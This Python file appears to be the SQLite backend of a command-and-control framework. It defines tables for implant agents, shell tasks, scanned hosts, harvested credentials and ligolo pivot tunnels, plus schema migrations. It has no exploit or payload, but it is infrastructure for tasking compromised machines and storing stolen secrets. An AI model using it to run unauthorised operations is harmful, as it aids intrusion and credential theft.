import sqlite3
import os

DB_PATH = os.path.join(os.path.dirname(__file__), "loot.db")


def get_conn():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def ensure_server_agent():
    """Insert the built-in 'server' agent used for operator-side executions."""
    with get_conn() as conn:
        conn.execute("""
            INSERT OR IGNORE INTO agents (agent_id, hostname, username)
            VALUES ('server', 'c2-server', 'operator')
        """)


def migrate_db():
    """Apply schema changes to existing databases."""
    with get_conn() as conn:
        cols = [r[1] for r in conn.execute("PRAGMA table_info(tasks)").fetchall()]
        if "task_type" not in cols:
            conn.execute("ALTER TABLE tasks ADD COLUMN task_type TEXT NOT NULL DEFAULT 'shell'")

        host_cols = [r[1] for r in conn.execute("PRAGMA table_info(hosts)").fetchall()]
        if "hostname" not in host_cols:
            conn.execute("ALTER TABLE hosts ADD COLUMN hostname TEXT DEFAULT ''")
        if "services" not in host_cols:
            conn.execute("ALTER TABLE hosts ADD COLUMN services TEXT DEFAULT '[]'")

        # tunnels table was added after initial release
        tables = [r[0] for r in conn.execute("SELECT name FROM sqlite_master WHERE type='table'").fetchall()]
        if "tunnels" not in tables:
            conn.execute("""
                CREATE TABLE tunnels (
                    tunnel_id   INTEGER PRIMARY KEY AUTOINCREMENT,
                    agent_id    TEXT NOT NULL,
                    interface   TEXT NOT NULL DEFAULT 'ligolo',
                    subnet      TEXT NOT NULL,
                    status      TEXT NOT NULL DEFAULT 'active',
                    created_at  TEXT NOT NULL DEFAULT (datetime('now')),
                    FOREIGN KEY (agent_id) REFERENCES agents(agent_id)
                )
            """)


def init_db():
    with get_conn() as conn:
        conn.executescript("""
            CREATE TABLE IF NOT EXISTS agents (
                agent_id    TEXT PRIMARY KEY,
                hostname    TEXT NOT NULL,
                username    TEXT NOT NULL,
                first_seen  TEXT NOT NULL DEFAULT (datetime('now')),
                last_seen   TEXT NOT NULL DEFAULT (datetime('now'))
            );

            CREATE TABLE IF NOT EXISTS tasks (
                task_id     INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id    TEXT NOT NULL,
                task_type   TEXT NOT NULL DEFAULT 'shell',
                instruction TEXT NOT NULL,
                status      TEXT NOT NULL DEFAULT 'pending',
                created_at  TEXT NOT NULL DEFAULT (datetime('now')),
                FOREIGN KEY (agent_id) REFERENCES agents(agent_id)
            );

            CREATE TABLE IF NOT EXISTS hosts (
                host_id      INTEGER PRIMARY KEY AUTOINCREMENT,
                ip           TEXT NOT NULL,
                hostname     TEXT DEFAULT '',
                open_ports   TEXT,
                services     TEXT DEFAULT '[]',
                discovered_by TEXT NOT NULL,
                discovered_at TEXT NOT NULL DEFAULT (datetime('now')),
                UNIQUE(ip)
            );

            CREATE TABLE IF NOT EXISTS results (
                result_id   INTEGER PRIMARY KEY AUTOINCREMENT,
                task_id     INTEGER NOT NULL,
                agent_id    TEXT NOT NULL,
                output      TEXT,
                received_at TEXT NOT NULL DEFAULT (datetime('now')),
                FOREIGN KEY (task_id) REFERENCES tasks(task_id),
                FOREIGN KEY (agent_id) REFERENCES agents(agent_id)
            );

            CREATE TABLE IF NOT EXISTS credentials (
                cred_id     INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id    TEXT NOT NULL,
                username    TEXT,
                secret      TEXT,
                cred_type   TEXT,
                source_host TEXT,
                harvested_at TEXT NOT NULL DEFAULT (datetime('now')),
                FOREIGN KEY (agent_id) REFERENCES agents(agent_id)
            );

            CREATE TABLE IF NOT EXISTS tunnels (
                tunnel_id   INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id    TEXT NOT NULL,
                interface   TEXT NOT NULL DEFAULT 'ligolo',
                subnet      TEXT NOT NULL,
                status      TEXT NOT NULL DEFAULT 'active',
                created_at  TEXT NOT NULL DEFAULT (datetime('now')),
                FOREIGN KEY (agent_id) REFERENCES agents(agent_id)
            );
        """)
